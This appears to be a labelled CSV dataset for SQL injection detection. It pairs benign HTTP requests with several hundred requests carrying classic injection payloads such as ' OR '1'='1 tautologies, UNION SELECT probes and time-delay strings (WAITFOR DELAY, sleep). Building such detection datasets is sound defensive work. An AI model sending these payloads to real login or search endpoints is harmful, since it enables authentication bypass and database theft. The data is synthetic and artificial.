text,flow_duration,label
"POST /login {'user': ''=0--+', 'pass': 'password123'}",10516,1
POST /search {'keyword': '1' ORDER BY 2--+'},11404,1
GET /images/products/N.jpg,137386,0
GET /assets/css/main.css,129702,0
GET /api/v1/users?id=' OR 1 -- -,26578,1
GET /api/v1/users?id=8515,116648,0
GET /images/products/3.jpg,39469,0
POST /search {'keyword': '' or 1=1 limit 1 --'},758,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",53923,1
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",7370,1
GET /products/details?productID=smith' OR '1'='1,130662,1
GET /search?q=OR+%271%27%3D%271,47893,1
GET /user/profile?user_id=1024-2,8078,1
GET /images/products/O.jpg,77008,0
GET /products/electronics/D,123008,0
GET /search.aspx?q='admin'--,1264,1
GET /images/products/4.jpg,10186,0
GET /search?q=';WAITFOR DELAY '0:0:30'--,7956,1
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",9136,1
GET /products/electronics/q,62184,0
POST /profile/update {'email': 'test.user@example.com'},84370,0
"POST /login {'user': '1' GROUP BY 1,2,3--+', 'pass': 'password123'}",4468,1
"POST /login {'user': '0', 'pass': 'password123'}",46119,0
GET /items/show.php?id=' AND id IS NULL; --,69964,1
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",95838,1
GET /products/details?productID=C,66696,0
GET /user/profile?user_id=' OR '1'='1,56863,1
GET /products/details?productID=OR+%271%27%3D%271,116399,1
GET /api/v1/users?id=2829,11058,0
GET /api/v1/users?id=2794,73024,0
GET /api/v1/users?id=105-1,94358,1
GET /api/v1/users?id=1024-2,77805,1
"GET /search?q=-1' UNION SELECT 1,2,3--+",144888,1
GET /api/v1/users?id=2133,32116,0
GET /api/v1/users?id=admin' #,4538,1
"POST /login {'user': '""""', 'pass': 'password123'}",4997,1
GET /images/products/c.jpg,89807,0
GET /api/v1/users?id=x' or 1=1--,5858,1
GET /search?q=A,104567,0
GET /products/details?productID=//,33846,1
GET /api/v1/users?id=x' or 1=1--,4088,1
GET /api/v1/users?id=' OR 'x'='x,5045,1
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",82140,1
GET /api/v1/users?id=7983,85590,0
GET /api/v1/users?id=9401,73892,0
GET /products/home/b,55874,0
GET /user/profile?user_id=' OR '1'='1,1057,1
GET /index.php?page=/*…*/,67704,1
GET /products/details?productID=' or 'x'='x,4972,1
GET /search?q=6,50501,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",5663,1
GET /index.php?page=1024-2,6843,1
GET /search?q=h,24214,0
POST /profile/update {'email': 'test.user@example.com'},61476,0
"POST /login {'user': '""', 'pass': 'password123'}",122884,1
GET /products/details?productID=x' or 1=1--,6495,1
GET /items/show.php?id=1024-2,2583,1
GET /user/profile?user_id=admin' #,7195,1
GET /search?q=smith' OR '1'='1,6120,1
GET /search?q=Q,130642,0
GET /search?q=T,53107,0
GET /products/details?productID=W,81216,0
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",18149,1
GET /api/v1/users?id=x' or 1=1--,2722,1
GET /user/profile?user_id=user1' or 1=1 --,6387,1
POST /search {'keyword': 'OR '1'='1''},97641,1
GET /search?q=' AND id IS NULL; --,65093,1
GET /search.aspx?q=' OR '1'='1,3416,1
GET /user/profile?user_id=' OR 1=1 /*,99269,1
POST /profile/update {'email': 'test.user@example.com'},26022,0
GET /index.php?page=1024-2,4205,1
GET /admin/login?user=1 AND 1=1,102832,1
GET /admin/login?user=105-1,1096,1
GET /index.php?page=/*…*/,82969,1
"POST /login {'user': 'v', 'pass': 'password123'}",108514,0
GET /products/details?productID=' or 'x'='x,2842,1
"POST /login {'user': 'a', 'pass': 'password123'}",4803,0
GET /assets/css/main.css,37702,0
POST /profile/update {'email': 'test.user@example.com'},86116,0
GET /images/products/E.jpg,46515,0
GET /assets/css/main.css,66035,0
GET /index.php?page=1 AND (SELECT * FROM Users) = 1,92682,1
GET /images/products/U.jpg,26321,0
POST /search {'keyword': '105-1'},35824,1
GET /assets/css/main.css,137097,0
"POST /api/v1/cart/add {'item_id': '6148', 'quantity': 1}",59270,0
"POST /login.php {'username': '/', 'password': 'password'}",3746,1
GET /products/details?productID=' AND id IS NULL; --,746,1
GET /api/v1/users?id=2557,83834,0
"POST /login {'user': 'o', 'pass': 'password123'}",18359,0
GET /search.aspx?q=' OR 1=1 /*,83824,1
GET /products/details?productID=' OR 'x'='x,2959,1
GET /api/v1/users?id=1860,67495,0
GET /index.php?page=' OR 1=1--,2422,1
GET /search?q=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,6234,1
GET /search?q=1 AND 1=1,24706,1
POST /profile/update {'email': 'test.user@example.com'},71434,0
GET /products/home/B,88796,0
GET /api/v1/users?id=' OR 1=1 /*,1472,1
GET /assets/css/main.css,85786,0
GET /user/profile?user_id=x' or 1=1--,16948,1
GET /search?q=L,13180,0
"POST /api/v1/cart/add {'item_id': '9521', 'quantity': 2}",20883,0
GET /index.php?page='admin'--,112065,1
POST /search {'keyword': '1' ORDER BY 2--+'},610,1
GET /assets/css/main.css,53367,0
"POST /api/v1/cart/add {'item_id': '8785', 'quantity': 2}",22657,0
GET /blog/posts?page=10,28045,0
"POST /login {'user': '6', 'pass': 'password123'}",33304,0
GET /blog/posts?page=4,135651,0
GET /products/details?productID=' OR 'x'='x,2821,1
GET /products/details?productID=u,68723,0
GET /assets/css/main.css,8190,0
GET /search?q=OR '1'='1',146977,1
GET /admin/login?user=1' and '1'='1,42460,1
GET /api/v1/users?id=7032,88781,0
GET /api/v1/users?id=4500,112006,0
GET /api/v1/users?id=smith' OR '1'='1,59584,1
GET /api/v1/users?id=2973,75643,0
GET /search.aspx?q=user1' or 1=1 --,32692,1
GET /admin/login?user=``,446,1
"POST /api/v1/cart/add {'item_id': '7230', 'quantity': 4}",73386,0
GET /user/profile?user_id=1*1,4762,1
GET /products/details?productID=105-1,90469,1
POST /search {'keyword': '1024-2'},23034,1
GET /blog/posts?page=20,147808,0
GET /images/products/M.jpg,148045,0
GET /assets/css/main.css,10369,0
GET /images/products/B.jpg,58304,0
GET /api/v1/users?id=7559,62030,0
GET /products/details?productID=' or 'x'='x,1346,1
GET /api/v1/users?id=7676,8913,0
GET /index.php?page=1 AND 1=1,3489,1
GET /search?q=1=1,6199,1
GET /user/profile?user_id=OR+%271%27%3D%271,111296,1
GET /products/details?productID=c,41454,0
GET /search?q=Z,65778,0
POST /search {'keyword': ''=''},113758,1
POST /profile/update {'email': 'test.user@example.com'},45836,0
GET /products/details?productID=F,123893,0
"POST /login.php {'username': 'admin' #', 'password': 'password'}",2489,1
GET /api/v1/users?id=6783,122891,0
GET /search?q=X,70821,0
GET /user/profile?user_id=' OR 'x'='x,5259,1
"GET /index.php?page=,(select * from (select(sleep(10)))a)",24385,1
GET /api/v1/users?id=9429,62921,0
GET /items/show.php?id=OR+%271%27%3D%271,1816,1
GET /images/products/B.jpg,54982,0
"POST /login {'user': 'w', 'pass': 'password123'}",7435,0
GET /blog/posts?page=6,82036,0
GET /products/details?productID=Z,7640,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",4698,1
GET /api/v1/users?id=104,14609,0
GET /products/details?productID=X,22381,0
GET /blog/posts?page=10,16242,0
GET /search?q=i,19634,0
GET /images/products/F.jpg,43126,0
GET /search.aspx?q=' OR '1'='1,65811,1
GET /products/details?productID=2,115172,0
GET /products/details?productID=' or 1=1 limit 1 --,149920,1
"POST /login {'user': 'G', 'pass': 'password123'}",33594,0
POST /search {'keyword': '' OR 1 -- -'},474,1
GET /images/products/N.jpg,67579,0
"GET /search?q=1' ORDER BY 1,2--+",64319,1
GET /search?q=f,19194,0
GET /assets/css/main.css,24361,0
GET /index.php?page=smith' OR '1'='1,96,1
GET /items/show.php?id=1*1,121641,1
"GET /admin/login?user=-1 UNION SELECT 1 INTO @,@,@",1121,1
GET /api/v1/users?id=1 AND 1=1,6028,1
GET /index.php?page=1*1,21698,1
GET /search?q=1' and '1'='1,26045,1
GET /products/details?productID=1*1,5435,1
GET /admin/login?user=\\,41777,1
GET /index.php?page=OR+%271%27%3D%271,2996,1
"POST /login.php {'username': '''', 'password': 'password'}",92386,1
GET /api/v1/users?id=admin' #,2615,1
GET /images/products/3.jpg,18927,0
GET /search?q=5,13888,0
"POST /login {'user': 'O', 'pass': 'password123'}",87003,0
GET /api/v1/users?id=1389,53469,0
"GET /search?q="" OR """" = """,60526,1
GET /products/details?productID=admin' #,56366,1
GET /search?q=0,38268,0
GET /images/products/e.jpg,26818,0
POST /profile/update {'email': 'test.user@example.com'},34545,0
GET /assets/css/main.css,43957,0
GET /images/products/c.jpg,29969,0
GET /items/show.php?id=' or 'x'='x,1612,1
"GET /items/show.php?id=""""",1545,1
GET /search?q=-- or #,4895,1
GET /products/details?productID=' OR 'x'='x,46687,1
"POST /login {'user': 'smith' OR '1'='1', 'pass': 'password123'}",968,1
"POST /login {'user': '' GROUP BY columnnames having 1=1 --', 'pass': 'password123'}",1670,1
GET /api/v1/users?id=1 AND 1=1,12793,1
GET /items/show.php?id=' OR '1'='1,149923,1
GET /search?q=9,142565,0
GET /search?q=' OR 'x'='x,108171,1
GET /user/profile?user_id=user1' or 1=1 --,4945,1
"POST /login.php {'username': 'OR+%271%27%3D%271', 'password': 'password'}",39123,1
GET /blog/posts?page=16,130097,0
GET /blog/posts?page=12,52406,0
GET /search?q=admin' #,1366,1
POST /search {'keyword': '1' and '1'='1'},27722,1
"POST /login {'user': 'H', 'pass': 'password123'}",62683,0
"POST /api/v1/cart/add {'item_id': '8481', 'quantity': 3}",23356,0
GET /api/v1/users?id=smith' OR '1'='1,7404,1
GET /assets/css/main.css,9759,0
POST /profile/update {'email': 'test.user@example.com'},79222,0
GET /api/v1/users?id=9444,136614,0
GET /assets/css/main.css,87187,0
GET /assets/css/main.css,113823,0
GET /products/details?productID=d,54127,0
POST /search {'keyword': '1=1'},3399,1
GET /api/v1/users?id=518,65758,0
"POST /login {'user': '-1 UNION SELECT 1 INTO @,@', 'pass': 'password123'}",2663,1
GET /admin/login?user=105-1,1169,1
POST /search {'keyword': '' OR 1=1 /*'},5843,1
"POST /api/v1/cart/add {'item_id': '4189', 'quantity': 3}",47333,0
GET /api/v1/users?id=' AND user IS NULL; --,179,1
GET /search?q=3,67955,0
"POST /login.php {'username': '1024-2', 'password': 'password'}",38759,1
GET /api/v1/users?id=OR+%271%27%3D%271,54464,1
GET /api/v1/users?id=user1' or 1=1 --,6459,1
"POST /login {'user': '1*1', 'pass': 'password123'}",23207,1
GET /products/details?productID=C,60444,0
"POST /login {'user': 'S', 'pass': 'password123'}",29057,0
GET /products/books/9,32279,0
GET /items/show.php?id=' OR 1=1 /*,12629,1
GET /assets/css/main.css,37260,0
POST /search {'keyword': 'x' or 1=1--'},26971,1
GET /search?q='''''''''''''UNION SELECT '2,71795,1
GET /assets/css/main.css,121893,0
GET /images/products/k.jpg,55157,0
GET /assets/css/main.css,51171,0
"GET /search.aspx?q=-1' UNION SELECT 1,2,3--+",1274,1
GET /api/v1/users?id=x' or 1=1--,103465,1
GET /index.php?page=smith' OR '1'='1,6468,1
"POST /api/v1/cart/add {'item_id': '7495', 'quantity': 1}",88896,0
GET /products/details?productID=0,78746,0
GET /search?q=' or 1=1 limit 1 --,2622,1
GET /search?q=h,28531,0
GET /images/products/M.jpg,52209,0
GET /products/details?productID=x' or 1=1--,145447,1
GET /products/details?productID=v,64982,0
GET /search.aspx?q=1' OR '1'='1' --,122,1
"POST /api/v1/cart/add {'item_id': '2079', 'quantity': 4}",6475,0
GET /search.aspx?q=%00,5382,1
GET /products/books/k,63031,0
"POST /login {'user': '7', 'pass': 'password123'}",29458,0
GET /search?q=AND false,7324,1
POST /profile/update {'email': 'test.user@example.com'},66965,0
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",96217,1
"POST /login {'user': 'P', 'pass': 'password123'}",24807,0
GET /products/details?productID=u,140072,0
GET /search?q=j,48158,0
"POST /login {'user': '//', 'pass': 'password123'}",2255,1
GET /api/v1/users?id='',3979,1
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",928,1
"POST /api/v1/cart/add {'item_id': '9170', 'quantity': 1}",99483,0
"POST /login.php {'username': '-1 UNION SELECT 1 INTO @,@,@', 'password': 'password'}",122722,1
GET /search?q=L,13154,0
GET /search?q=N,20566,0
"GET /products/details?productID="" OR 1 = 1 -- -",119331,1
GET /images/products/M.jpg,49702,0
GET /products/books/w,35533,0
POST /profile/update {'email': 'test.user@example.com'},53477,0
GET /admin/login?user=x' or 1=1--,1075,1
"POST /login {'user': 'm', 'pass': 'password123'}",18256,0
GET /products/details?productID=j,73575,0
POST /profile/update {'email': 'test.user@example.com'},81000,0
"POST /api/v1/cart/add {'item_id': '8820', 'quantity': 5}",42056,0
GET /search?q=t,64322,0
GET /search?q=R,77608,0
GET /items/show.php?id=1024-2,16933,1
GET /products/home/D,127919,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",139215,1
GET /api/v1/users?id=7543,88614,0
GET /products/details?productID=Z,63849,0
GET /products/details?productID=N,4158,0
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",7796,1
"POST /login {'user': 'Y', 'pass': 'password123'}",15655,0
"POST /api/v1/cart/add {'item_id': '2708', 'quantity': 4}",70557,0
"GET /items/show.php?id="" OR 1 = 1 -- -",933,1
GET /items/show.php?id=OR+%271%27%3D%271,117326,1
GET /search.aspx?q=1*1,8536,1
GET /api/v1/users?id=' OR 1=1--,33839,1
GET /search?q=-2,75919,1
GET /products/books/D,148492,0
GET /assets/css/main.css,32181,0
GET /admin/login?user=' OR '1'='1,1276,1
GET /products/details?productID=6,43051,0
GET /blog/posts?page=8,11319,0
GET /user/profile?user_id=user1' or 1=1 --,56452,1
"POST /login {'user': '\', 'pass': 'password123'}",125390,1
GET /products/electronics/O,17532,0
"POST /api/v1/cart/add {'item_id': '5924', 'quantity': 5}",6381,0
GET /products/electronics/q,28850,0
POST /search {'keyword': '';WAITFOR DELAY '0:0:30'--'},14323,1
POST /search {'keyword': ''admin'--'},99050,1
GET /products/details?productID=7,80920,0
GET /assets/css/main.css,108315,0
GET /products/books/L,23654,0
GET /products/details?productID=OR '1'='1',2669,1
"POST /login {'user': 'C', 'pass': 'password123'}",80971,0
POST /search {'keyword': '' OR 1=1 /*'},92850,1
GET /search?q=OR '1'='1',4947,1
GET /blog/posts?page=13,48156,0
GET /products/details?productID=' OR 'x'='x,146432,1
GET /blog/posts?page=20,5166,0
"POST /login.php {'username': '' AND id IS NULL; --', 'password': 'password'}",22654,1
"POST /login {'user': '0', 'pass': 'password123'}",76987,0
GET /products/details?productID=1' and '1'='1,101930,1
GET /blog/posts?page=14,89816,0
GET /products/books/g,67258,0
GET /items/show.php?id=105-1,4694,1
GET /items/show.php?id=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,57515,1
"GET /index.php?page=""""",4195,1
GET /index.php?page=\,43336,1
POST /search {'keyword': '' AND user IS NULL; --'},2923,1
GET /products/books/6,70637,0
"POST /login {'user': 'I', 'pass': 'password123'}",69643,0
"POST /login.php {'username': '' OR 1=1 /*', 'password': 'password'}",92592,1
GET /blog/posts?page=10,9340,0
GET /assets/css/main.css,60021,0
GET /assets/css/main.css,50768,0
GET /user/profile?user_id=' GROUP BY columnnames having 1=1 --,5088,1
GET /products/details?productID=s,89552,0
POST /search {'keyword': ''LIKE''},37417,1
GET /index.php?page=1*1,62504,1
GET /products/books/L,75553,0
GET /products/details?productID=X,57200,0
GET /admin/login?user=`,92144,1
GET /products/details?productID=' OR 'x'='x,5799,1
GET /index.php?page=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,10442,1
"POST /login {'user': '1*1', 'pass': 'password123'}",21800,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",100670,1
GET /admin/login?user=OR 1=1,114,1
GET /images/products/6.jpg,30263,0
GET /search?q=smith' OR '1'='1,6818,1
POST /profile/update {'email': 'test.user@example.com'},7378,0
GET /items/show.php?id=/*…*/,5611,1
GET /blog/posts?page=1,141729,0
GET /products/details?productID=K,70520,0
GET /search?q=' OR 1=1 /*,5348,1
GET /api/v1/users?id=1 AND 1=1,3766,1
GET /search?q=h,106106,0
GET /items/show.php?id=' OR 1=1--,75870,1
GET /api/v1/users?id=smith' OR '1'='1,7873,1
POST /profile/update {'email': 'test.user@example.com'},143292,0
GET /search?q=x,28999,0
GET /products/details?productID=R,60987,0
GET /images/products/9.jpg,33513,0
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",1131,1
"POST /api/v1/cart/add {'item_id': '6866', 'quantity': 3}",55737,0
"POST /login {'user': 'q', 'pass': 'password123'}",24003,0
GET /images/products/z.jpg,17087,0
POST /profile/update {'email': 'test.user@example.com'},59780,0
GET /products/details?productID=' or 1=1 limit 1 --,7510,1
GET /products/home/R,49264,0
GET /assets/css/main.css,48645,0
GET /products/home/V,78224,0
GET /user/profile?user_id=' or 'x'='x,76533,1
GET /search.aspx?q=' OR '1,3601,1
GET /api/v1/users?id=696,26926,0
GET /products/details?productID=' or 'x'='x,685,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",48549,1
"POST /login {'user': 'u', 'pass': 'password123'}",79540,0
GET /search?q=smith' OR '1'='1,1688,1
GET /user/profile?user_id=%2c(select%20*%20from%20(select(sleep(10)))a),6030,1
GET /products/details?productID=OR '1'='1',883,1
GET /api/v1/users?id=8881,8194,0
GET /api/v1/users?id=8148,73554,0
GET /api/v1/users?id=1357,38332,0
GET /items/show.php?id=OR+%271%27%3D%271,6968,1
GET /products/details?productID=' OR 1=1--,2523,1
GET /search?q=1' and '1'='1,7397,1
GET /search.aspx?q='=0--+,6799,1
GET /search?q=V,81142,0
GET /products/details?productID=' OR 1=1--,114094,1
"POST /login {'user': 'O', 'pass': 'password123'}",56161,0
GET /products/details?productID=B,87609,0
GET /user/profile?user_id=',111575,1
"POST /api/v1/cart/add {'item_id': '3422', 'quantity': 4}",133961,0
GET /products/home/y,9086,0
